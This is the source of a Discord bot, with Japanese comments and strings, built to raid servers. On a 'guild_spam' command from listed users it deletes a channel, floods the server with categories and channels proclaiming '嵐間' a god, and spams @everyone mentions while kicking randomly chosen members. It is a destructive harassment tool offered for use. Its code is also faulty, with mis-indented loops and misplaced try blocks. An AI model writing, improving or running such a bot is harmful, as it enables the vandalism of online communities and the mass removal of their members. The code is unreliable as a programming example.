import discord
from discord.ext import commands
import random

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=[""],intents=intents)
bot.remove_command("help")

@bot.event
async def on_message(message):
  if message.guild:
        bot_author = "User name" , "name2" ,"name3..."
        if message.author.name in bot_author:
          if message.content.startswith("guild_spam"):

            if message.content.split()[1] == "ID":
              print(message.content.split()[2])
              guild_name = bot.get_guild(int(message.content.split()[2]))
              print(guild_name)
            else:
              print(message.content.split()[1])
              guild_name = discord.utils.get(bot.guilds, name=str(message.content.split()[1]))
              print(guild_name)

            for T in range(0,len (guild_name.text_channels)):
              print(guild_name.text_channels[T])
            try:
              await guild_name.text_channels[T].delete()
              print(f"{guild_name.text_channels[T]} | delete")
              LobbyName = "嵐間こそ神だ！！"
              Category = await guild_name.create_category(LobbyName)
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              Category = await guild_name.create_category(LobbyName)
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              Category = await guild_name.create_category(LobbyName)
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              Category = await guild_name.create_category(LobbyName)
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              await Category.create_text_channel("嵐間様の教え")
              print("チャンネル削除、カテゴリー生成、チャンネル生成成功")
            except:
              print("カテゴリー生成失敗しちゃった、")
              pass
              
              await message.channel.send(f"__{str(guild_name)}__\n ping __{round(bot.latency * 1000)}__ms:arrows_counterclockwise:")
              count = 0
              error_count = 0
                while count<100:

                    for guild_Length in range(0, len(guild_name.text_channels)):
                        try:
                            user = random.choice(guild_name.text_channels[guild_Length].members)
                            await guild_name.text_channels[guild_Length].send(f"@everyone {user.mention}")
                            count = count + 1
                            try:
                                await user.kick()
                                print(f"{user}をkick")
                            except:
                                pass
                        except:
                            print(f"error:{error_count}")
                            count = count + 1
                            error_count = error_count + 1
                            pass

                print(f"{str(guild_name)}|{count}回中{count - error_count}回成功")


bot.run("TOKEN")
